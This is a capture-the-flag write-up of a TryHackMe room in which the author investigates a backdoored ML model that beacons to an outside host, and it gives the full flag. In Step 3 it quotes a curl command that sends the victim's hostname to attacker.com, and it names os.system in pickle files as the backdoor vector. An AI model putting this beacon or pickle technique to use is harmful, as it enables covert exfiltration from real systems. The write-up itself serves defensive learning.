@@ -1,0 +1,67 @@
+# Room Name - TryHackMe: Payload
+Date: 15 July 2026
+Difficulty: Easy
+Category: DFIR / Supply Chain Attack / ML Model Security
+
+# Scenario
+TryTrainMe's production code review model is phoning home. Investigate the breach. The challenge involved analysing deployment logs, decompiling a malicious ML model, and recovering a flag split across two artefacts to reconstruct the full attack chain.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- nano (log file viewer)
+- modelscan (ML model security scanner)
+- inspect_h5_model.py (custom H5 model inspector)
+
+# What I Did
+
+Step 1 — Navigate to the incident directory
+- Redirected to the incident logs directory: /opt/supply-chain/incident/logs/
+- Opened the deployment log using nano deployment.log
+
+Step 2 — Analyse the deployment log
+- Read through deployment.log and identified a warning entry showing that the production model had been replaced by one from an external organisation: trustworthy-ai-lab
+- Noted the timestamp of the replacement: 2024-01-26 14:32:14
+- Found the SOC automated alert timestamp for unusual outbound HTTPS traffic: 2024-02-16 03:14:00
+- Calculated the gap between deployment and alert: 21 days
+
+Step 3 — Decompile the production model
+- Ran modelscan against the production model: modelscan -p /opt/supply-chain/incident/models/production_model.pkl
+- Scanner returned a CRITICAL finding: use of unsafe operator system from the os module, confirming a backdoored pickle model
+- Identified the embedded shell command used to capture host identity: curl "http://attacker.com/beacon" -d "host=$(hostname)"
+- The payload used the hostname command to identify the compromised machine
+
+Step 4 — Review the beacon capture log
+- Opened beacon_capture.log and found the outbound HTTP request entry
+- Confirmed the HTTP method used in the beacon call: POST
+- Found the partial campaign ID embedded in the beacon payload: THM{b4ckd00r_1n_
+
+Step 5 — Inspect the candidate replacement model
+- Ran inspect_h5_model.py against the staged H5 model: python3 inspect_h5_model.py /opt/supply-chain/incident/models/candidate_model.h5
+- The inspector flagged a suspicious Lambda layer named manipulate_output
+- The layer contained the second half of the flag as an exfil suffix: pl41n_s1ght}
+
+Step 6 — Reconstruct the full flag
+- Combined the partial ID from beacon_capture.log with the exfil suffix from the candidate model to recover the complete flag
+
+# What I Found
+- Source Organisation of Replacement Model: trustworthy-ai-lab
+- Days Between Deployment and SOC Alert: 21 days
+- Unsafe Python Function in Payload: system (os.system)
+- Shell Command Used: hostname
+- HTTP Method in Beacon: POST
+- Suspicious Layer in Candidate Model: manipulate_output
+- Flag (Part 1 from beacon_capture.log): THM{b4ckd00r_1n_
+- Flag (Part 2 from candidate model): pl41n_s1ght}
+- Full Flag: THM{b4ckd00r_1n_pl41n_s1ght}
+
+# Key Learning
+ML model files such as .pkl and .h5 are executable artefacts, not just data. A malicious actor can embed arbitrary Python code inside a serialised model that executes on load, making supply chain integrity checks critical before any model reaches production. The 21-day gap between deployment and the SOC alert highlights how long backdoored models can operate undetected without dedicated ML security tooling. Splitting the campaign ID across two artefacts (beacon log and candidate model) is a deliberate evasion technique to avoid full exposure in any single capture.
+
+# What I Would Flag in a Real SOC
+- Any new source organisation appearing in deployment logs should trigger an immediate review and block pending verification, model provenance must be treated with the same rigour as third-party code dependencies
+- Pickle files (.pkl) should never be loaded from untrusted sources without prior scanning using tools such as modelscan, os.system inside a pickle is a classic and well-documented attack vector
+- Outbound HTTPS traffic from ML inference servers to external domains is a strong indicator of compromise and should be alerted on in real time, a 21-day dwell time is unacceptable
+- Lambda layers in H5 models are a known vector for embedding malicious functions and should be flagged during model review pipelines before deployment to staging or production
+- Splitting payloads across artefacts to avoid single-point detection is an evasion technique that requires correlation across multiple log sources, SIEM rules should be written to join beacon logs with model inspection outputs
+- Candidate models awaiting deployment should be subject to the same security scanning as production models, a backdoor in a staged model is a breach waiting to happen
